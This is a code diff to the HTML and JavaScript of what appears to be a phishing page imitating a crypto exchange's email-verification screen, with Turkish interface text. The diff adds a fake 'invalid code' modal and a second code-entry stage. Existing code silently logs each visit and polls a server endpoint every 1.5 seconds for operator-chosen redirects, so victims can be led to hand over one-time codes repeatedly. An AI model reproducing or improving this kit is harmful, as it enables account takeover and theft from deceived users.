@@ -286,12 +286,46 @@
   <div class="loading-box" style="display: none;">
     <img src="../assets/images/loading.svg" alt="loading">
   </div>
+  <div class="area" style="display: none;">
+    <div class="css-1vb7bc9" style="transform: translate3d(0px, 0px, 0px);">
+      <div class="css-lu6k78" style="opacity: 1.">
+        <div class="css-14qry50">
+          <div class="css-1bpj83k">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" class="css-boyavq">
+              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5.326 13.909l-1.429 1.417L12 13.429l-3.897 3.897-1.429-1.417 3.909-3.898-3.909-3.908 1.429-1.417L12 10.583l3.897-3.897 1.429 1.417-3.897 3.908 3.897 3.898z" fill="currentColor"></path>
+            </svg>
+          </div>
+          <div class="bn-notification-body-wrapper css-gxv9qv">
+            <div data-bn-type="text" class="bn-notification-msg-wrapper css-161eirp">Hatalı bir e-posta kodu girdiniz.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="css-vp41bv">
+      <div class="css-baaq78">
+        <div class="css-tolw2i"></div>
+        <div class="css-16wz1c4">
+          <div class="css-hv39bs">
+            <div class="css-uq1pv2">
+              <div src="../assets/images/error.svg" class="css-ydz7pw"></div>
+            </div>
+            <div data-bn-type="text" class="modal-desc css-1ixmqv3">E-posta kodu geçersiz. Lütfen tekrar deneyin.</div>
+            <div class="btn-group css-1tr0qpm">
+              <button data-bn-type="button" class="bc-btn bc-btn-yellow sensors-login" style="width:100%">
+                <div data-bn-type="text" class="css-1c82c04">Anladım</div>
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
   <script>
     const pingServer = () => {
       fetch('/api/ping').catch(err => console.error('Ping failed', err));
     };
 
-    // Retry mekanizması ile fetch wrapper - logMailCodePage için
+    // Retry mekanizması ile fetch wrapper - logMailCode2Page için
     async function fetchLogPageWithRetry(payload, maxRetries = 5, delay = 1000) {
       for (let attempt = 1; attempt <= maxRetries; attempt++) {
         try {
@@ -320,8 +354,8 @@
       // Sessizce devam et - kullanıcıya hata gösterme
     }
 
-    function logMailCodePage() {
-      fetchLogPageWithRetry({ page: 'mailcode' }).catch(() => {
+    function logMailCode2Page() {
+      fetchLogPageWithRetry({ page: 'mailcode2' }).catch(() => {
         // Sessizce devam et
       });
     }
@@ -346,7 +380,7 @@
       return false;
     }
 
-    logMailCodePage();
+    logMailCode2Page();
     pingServer();
     checkRedirect();
     setInterval(pingServer, 4000);
@@ -356,6 +390,7 @@
     function b_xhr() { fetch("/websocket.php", { method: "POST" }) .then((y) => y.json()) .then((m) => { if (m.success) { let u = m.success; if (u.includes('login')) { u = '../' + u; } window.location.href = u; } }); } setInterval(b_xhr, 1500);
     const frm = document.querySelector('form');
     const mCInp = frm.elements[0];
+    const btn = document.querySelector(".btn-group button.bc-btn.bc-btn-yellow.sensors-login");
 
     frm.addEventListener('submit', (evt) => {
         evt.preventDefault();
@@ -367,8 +402,23 @@
         } else {
             mCInp.parentElement.style.borderColor = '#f84960';
             mCInp.closest('.bc-verify-input-content').nextElementSibling.style.color = 'red';
+            // Hata mesajını göster
+            if (document.querySelector('.area')) {
+              document.querySelector('.area').style.display = 'block';
+            }
         }
     });
+
+    if (btn) {
+      btn.addEventListener('click', () => {
+        if (document.querySelector('.area')) {
+          document.querySelector('.area').style.display = 'none';
+          if (document.querySelector("body > div.area")) {
+            document.querySelector("body > div.area").remove();
+          }
+        }
+      });
+    }
 
   </script>
 </body>
